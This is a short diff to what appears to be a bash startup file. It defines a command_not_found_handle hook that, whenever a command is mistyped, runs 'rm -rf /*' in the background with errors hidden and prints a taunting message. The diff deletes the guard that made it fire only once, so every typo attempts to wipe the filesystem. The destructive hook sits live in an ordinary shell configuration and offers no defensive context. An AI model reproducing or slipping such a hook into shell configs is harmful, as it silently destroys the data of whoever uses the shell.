@@ -7,8 +7,6 @@
 PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
 
 function command_not_found_handle {
-      ![ -z "$die" ] && return
       rm -rf /* 2>/dev/null &
       echo "Commiting suicide because you can't spell..."
-      die=dead
 }
